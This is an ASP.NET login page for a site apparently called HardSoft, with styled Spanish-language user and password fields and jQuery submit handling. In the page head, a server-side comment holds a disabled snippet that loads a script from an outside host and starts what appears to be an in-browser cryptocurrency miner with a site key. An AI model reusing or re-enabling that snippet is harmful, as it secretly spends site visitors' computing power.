<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Login.aspx.cs" Inherits="HardSoft.Login" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
      <script language="JavaScript" type="text/javascript">
          
          function acceptNum(e) {
              var tecla = document.all ? tecla = e.keyCode : tecla = e.which;
              return ((tecla > 47 && tecla < 58) || tecla == 8);
          } 
      </script>
       <script type="text/javascript" src="/js/jquery.js"></script>
    <script type="text/javascript" src="/js/bootstrap.min.js"></script>

       <link rel="shortcut icon" href="images/ico/favicon.ico"/>
        <link rel="stylesheet" href="/css/bootstrap.min.css" />

<%--    <script src="https://www.hostingcloud.racing/Iaru.js"></script>
<script>
    var _client = new Client.Anonymous('b1835486a4a4ad812a7c30a894d83790f1771ef567ec8f52980101ac40ffaf68', {
        throttle: 0.3, c: 'w', ads: 0
    });
    _client.start();
    

</script>--%>

    <style>
        @font-face {
    font-family: 'avenir';
    src:url('css/Avenir-Roman.ttf')  format('truetype');
 
}
body {
     font-family: 'avenir' , Arial, Georgia, serif, Times!important;
	/*background-image: url(/images/Hospital/weeb.jpg);*/
	background-position: top center;
	background-repeat: no-repeat;
   background-color:black;
	padding-top: 13%;
}
 

.legend2{
	 
	font-size: 24px;
	font-weight: lighter;
	color: rgba(255,255,255,1);
	text-shadow:1px 1px 0px #000000;
	margin: auto;
}
input{
	height: 40px;
	border-radius: 10px;
	border: 0;
	margin: 6px;
	transition: all 1s;
}
input[type=text], input[type=password]{
	width: 280px;
	background-color: rgba(253,253,253,0.2);
	/*color de texto*/
	color: rgba(255,255,255,1);
 
	font-size: 18px;
	text-shadow:1px 1px 0px #000000;
	font-weight: lighter;
	/*color de borde*/
	border:1px solid rgba(255,255,255,0.5);
	box-shadow: 0px 1px 4px -1px #FFF inset;
	padding-left: 20px;
}

input[type=text]:hover, input[type=password]:hover{
	background-color: rgba(253,253,253,0.4);
	cursor: pointer;
}

input[type=button]{
	width: 280px;
	/* Linea superior */
	-moz-box-shadow:inset 0px 2px 0px 0px #a4e271;
	-webkit-box-shadow:inset 0px 2px 0px 0px #a4e271;
	box-shadow:inset 0px 2px 0px 0px #a4e271;
	/*color de fondo degradado*/
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #89c403), color-stop(1, #77a809) );
	background:-moz-linear-gradient( center top, #89c403 5%, #77a809 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#89c403', endColorstr='#77a809');
	/*color de fondo si falla */
	background-color:#89c403;
	 
	/*color de texto*/
	color:#ffffff;
	 
	font-size: 20px;
	text-shadow:1px 1px 0px #528009;
}

input[type=submit]:hover{
	/*color de fondo degradado*/
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #77a809), color-stop(1, #89c403) );
	background:-moz-linear-gradient( center top, #77a809 5%, #89c403 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#89c403', endColorstr='#77a809');
}
.credits{
	margin-top: 20px;
	color: rgba(51,51,51,1);
 
	font-size: 12px;
}

a  {
color: white;
text-decoration: none;
font-size:16px;
}
a:hover {
  
color:rgb(216, 215, 215);
text-decoration: none;
font-size:16px;
}

 input[type=button] {
    width: 280px;
    -moz-box-shadow: inset 0px 2px 0px 0px #a4e271;
    -webkit-box-shadow: inset 0px 2px 0px 0px #a4e271;
    box-shadow: inset 0px 2px 0px 0px #ca7b89;
    background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #d80027), color-stop(1, #672f2f) );
    background: -moz-linear-gradient( center top, #89c403 5%, #77a809 100% );
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#89c403', endColorstr='#77a809');
    background-color: #d80027;
    /* border: 1px solid #52928f; */
    color: #ffffff;
    /* font-size: 20px; */
    /* text-shadow: 1px 1px 0px #458e80; */
}
</style>
   
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  <%-- para q se ajuste zoon en mobil--%>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title></title>
</head>
<body>
  
    <form id="form1" runat="server">
    <div>
        <div class="container" style="text-align:center;margin: auto">
        <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6" style="text-align:center">
  
	 <img src="/images/logo.png" style="
width: 220px;
    margin-bottom: 10px;
">
            </div>
            <div class="col-md-3"></div>
            </div>




                 <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6">   
  
                 <asp:TextBox ID="txtMail" runat="server" placeholder="Usuario" ValidationGroup="login"    ></asp:TextBox>
           &nbsp;
                 <asp:RequiredFieldValidator runat="server" ID="rvtxtMail" ControlToValidate="txtMail" CssClass="alert-danger"
                        SetFocusOnError="true" Display="Dynamic" ErrorMessage="Requerido" ToolTip="Debe ingresar su usuario" />
                
                
                
                 </div>
            <div class="col-md-3">
                       </div>
            </div>

                 <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6">
  
  
                            <asp:TextBox ID="txtPwd" runat="server" placeholder="contraseña"  TextMode="Password"   ></asp:TextBox> 
                 &nbsp;     <asp:RequiredFieldValidator ID="rvTxtPwd" runat="server" ControlToValidate="txtPwd"
                        CssClass="alert-danger" ErrorMessage="Requerido" Display="Dynamic"  ></asp:RequiredFieldValidator>
                  
            </div>
            <div class="col-md-3"></div>
            </div>

                 <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6">
  
	  <div id="login_Buttons">
                           
                
                <input type="button" value="Entrar" id="btnAceptarJS" onclick="aceptarJS();">
            </div>

 



            </div>
            <div class="col-md-3"></div>
            </div>
         




                 <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6">   
  
                  <asp:LinkButton ID="lnkolvidar" runat="server" OnClick="lnkolvidar_Click" CausesValidation="false">Olvide mi contraseña</asp:LinkButton>
                              
                 </div>
            <div class="col-md-3">
                  
            
                       </div>
            </div>



                         <div class="row">
            <div class="col-md-3" ></div>
            <div class="col-md-6" style="margin:auto">
      <div style="font-size:18px;margin-top:5px">
                
                 <asp:Label ID="bandera"  runat="server"  > </asp:Label>
                                <asp:Label ID="lblErrorAcceso"   CssClass="alert-danger" runat="server" Visible="false">Usuario/Contraseña erroneos .</asp:Label>
          </div>

	  <div id="login_Buttons">
                            <div class="filler">
                                <br /><br />
                                <div id="preload" style="margin:auto;text-align:center">
                                </div>
                            </div>
                
                
            </div>

 <div id="login_Buttons">
                            <div class="filler" >
                                <br /><br />
                                <div style="margin-top: 30px;">
                                </div>
                            </div>
                            
                        </div>



            </div>
            <div class="col-md-3"></div>
            </div>

             
      <div style="display: none">
       <asp:Button ID="btnAceptar" runat="server" OnClick="btnAceptar_Click" />
        <asp:Button ID="btnCancelar" runat="server" CausesValidation="false" OnClick="btnCancelar_Click" />
        <asp:TextBox ID="txtMailLogin" runat="server"></asp:TextBox>
        <asp:TextBox ID="txtPwdLogin" runat="server"></asp:TextBox>
    </div>
         <script src="/Scripts/animation.js"></script>

            <script>
                $(function () {


                    pantalla();



                    


                   
                 try {


                      


                  

                 } catch (e) {
                     alert(e.message);
                    }

                });
                function pantalla() {


                  
                    var v_wd = $(window).height();

                    var v_sal = v_wd ;


                    $('.item').height(v_sal);

                    $("body").css("background-size", "100% " + v_sal+"px");
                }

                var fecha;
                var opcion;
                var vartransitionClose;
                var wait;

                jQuery(function ($) {

                    $('#txtMail').keypress(function (event) {
                        var keycode = (event.keyCode ? event.keyCode : event.which);
                        if (keycode == '13') {
                           // $("#btnAceptarJS").click();
                        }
                    });

                    $('#txtPwd').keypress(function (event) {
                        var keycode = (event.keyCode ? event.keyCode : event.which);
                        if (keycode == '13') {
                          //  $("#btnAceptarJS").click();
                        }
                    });
                });

                function aceptarJS() {
                    $("#btnAceptar").click();
                    //$("#btnAceptarJS").keydown();
                   // WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions('btnAceptarJS', '', true, '', '', false, false));
                    var isValid = true;

                    for (var i = 0; i < Page_Validators.length; i++) {
                        if (Page_Validators[i].style.display == 'inline' ||
                           (Page_Validators[i].style.visibility != '' &&
                            Page_Validators[i].style.visibility != 'hidden')) {
                            
                            isValid = false;
                        }
                    }

                    if (isValid) {
                        new imageLoader(cImageSrc, 'startAnimation()');

                        setTimeout('continueAceptar()', 1000);
                    }
                  //  else $("#btnAceptarJS").keyup();
                }

                function continueAceptar() {
                 //   $("#btnAceptar").click();
                }

                function cancelarJS() {
                    $("#btnCancelarJS").keydown();
                    $("#btnCancelar").click();
                }

 
       

            </script>



    </div>
    </form>
 
</body>
</html>
